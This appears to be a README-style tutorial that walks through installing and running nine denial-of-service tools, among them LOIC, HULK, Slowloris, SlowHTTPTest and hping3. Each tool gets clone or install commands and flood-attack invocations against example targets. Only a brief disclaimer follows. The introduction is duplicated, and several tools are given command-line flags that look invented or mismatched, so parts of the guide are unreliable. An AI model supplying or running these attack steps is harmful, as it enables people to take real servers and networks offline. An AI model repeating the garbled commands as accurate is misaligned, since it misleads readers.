# DDoS-Tools
DDoS (Distributed Denial of Service) attacks are a type of cyber attack where multiple compromised systems flood a targeted server or network with traffic, overwhelming it and rendering it unavailable to legitimate users. In this writeup, we will guide you through the process of setting up and using various DDoS tools to conduct a DDoS attack.


# How to Install and Use DDoS Tools

Introduction:
DDoS (Distributed Denial of Service) attacks are a type of cyber attack where multiple compromised systems flood a targeted server or network with traffic, overwhelming it and rendering it unavailable to legitimate users. In this writeup, we will guide you through the process of setting up and using various DDoS tools to conduct a DDoS attack.

Prerequisites:
- A Linux machine with at least 2 GB of RAM and a stable internet connection.
- Basic knowledge of command-line interface (CLI).

### Installation and Usage:
1. LOIC (Low Orbit Ion Cannon):
   - Install Mono on your Linux machine.
     ```bash
     sudo apt-get install mono-complete
     ```

   - Download the latest version of LOIC from the official GitHub repository.
     ```bash
     wget https://github.com/NewEraCracker/LOIC/releases/download/v2.1.2/loic_2.1.2.zip
     ```

   - Unzip the downloaded file.
     ```bash
     unzip loic_2.1.2.zip
     ```

   - Navigate to the unzipped directory.
     ```bash
     cd loic_2.1.2
     ```

   - Launch LOIC with the following command:
     ```bash
     mono LOIC.exe
     ```

   - In the LOIC interface, select the desired attack type (e.g., HTTP Flood) from the drop-down menu.
   - Enter the target IP address or domain name in the "IP/Domain" field.
   - Enter the target port number in the "Port" field.
   - Set the desired number of connections in the "Connections" field.
   - Set the duration of the attack in the "Duration" field (in seconds).
   - Click the "Start" button to start the attack.
   - Monitor the attack progress in the LOIC interface.
   - To stop the attack, click the "Stop" button.

2. HULK (High-Level Unconventional Load Killer):
   - Install HULK on your Linux machine.
     ```bash
     pip install hulk
     ```

   - Use HULK with the following command:
     ```bash
     hulk -a <attack-type> -t <target-ip> -p <target-port> -d <duration>
     ```

   - Example:
     ```bash
     hulk -a http -t 192.168.1.100 -p 80 -d 60
     ```

3. DDOS-Ripper:
   - Install DDOS-Ripper on your Linux machine.
     ```bash
     git clone https://github.com/palahsu/DDoS-Ripper.git
     cd DDoS-Ripper
     ./install.pl
     ```

   - Use DDOS-Ripper with the following command:
     ```bash
     perl DRipper.pl -s <target-ip> -p <target-port> -t <attack-type> -d <duration>
     ```

   - Example:
     ```bash
     perl DRipper.pl -s 192.168.1.100 -p 80 -t http -d 60
     ```

4. Torshammer:
   - Install Torshammer on your Linux machine.
     ```bash
     git clone https://github.com/dotfighter/torshammer.git
     cd torshammer
     ./install.sh
     ```

   - Use Torshammer with the following command:
     ```bash
     ./torshammer.py -t <target-ip> -p <target-port> -r <requests-per-second> -d <duration>
     ```

   - Example:
     ```bash
     ./torshammer.py -t 192.168.1.100 -p 80 -r 1000 -d 60
     ```

5. Slowloris:
   - Install Slowloris on your Linux machine.
     ```bash
     git clone https://github.com/gkbrk/slowloris.git
     cd slowloris
     perl slowloris.pl -dns <target-domain> -timeout 10
     ```

   - Example:
     ```bash
     perl slowloris.pl -dns example.com -timeout 10
     ```

6. PyLoris:
   - Install PyLoris on your Linux machine.
     ```bash
     git clone https://github.com/NoLegalTech/pyloris.git
     cd pyloris
     pip install -r requirements.txt
     ```

   - Use PyLoris with the following command:
     ```bash
     python pyloris.py <target-ip> <target-port> <number-of-sockets>
     ```

   - Example:
     ```bash
     python pyloris.py 192.168.1.100 80 1000
     ```

7. DDoSX:
   - Install DDoSX on your Linux machine.
     ```bash
     git clone https://github.com/Bilalcaliskan/DDoSX.git
     cd DDoSX
     pip install -r requirements.txt
     ```

   - Use DDoSX with the following command:
     ```bash
     python3 DDoSX.py -t <target-ip> -p <target-port> -d <duration>
     ```

   - Example:
     ```bash
     python3 DDoSX.py -t 192.168.1.100 -p 80 -d 60
     ```

8. SlowHTTPTest:
   - Install SlowHTTPTest on your Linux machine.
     ```bash
     git clone https://github.com/shekyan/slowhttptest.git
     cd slowhttptest
     ./configure
     make
     ```

   - Use SlowHTTPTest with the following command:
     ```bash
     ./slowhttptest -c <concurrent-connections> -H -r <requests-per-second> -t <duration> -u <target-url>
     ```

   - Example:
     ```bash
     ./slowhttptest -c 100 -H -r 1000 -t 60 -u http://example.com
     ```

9. Hping3:
   - Install Hping3 on your Linux machine.
     ```bash
     sudo apt-get install hping3
     ```

   - Use Hping3 for DDoS attacks with the following command:
     ```bash
     hping3 -S <target-ip> -p <target-port> -i u<interval-in-ms> -c <number-of-packets>
     ```

   - Example:
     ```bash
     hping3 -S 192.168.1.100 -p 80 -i u1000 -c 10000
     ```

### Disclaimer:
Please note that conducting a DDoS attack is illegal and unethical. The use of these tools should be done with caution and for educational purposes only. The author is not responsible for any misuse or damage caused by the tools.

Remember to obtain proper authorization from the target system before conducting any DDoS attack.

### Conclusion:
By following this writeup, you should now have a basic understanding of how to install and use various DDoS tools. Remember to conduct such attacks responsibly and with proper authorization.

This writeup provides a comprehensive guide on how to install and use various DDoS tools. It covers installation steps, command usage, and provides examples for each tool. Remember to conduct DDoS attacks responsibly and with proper authorization.
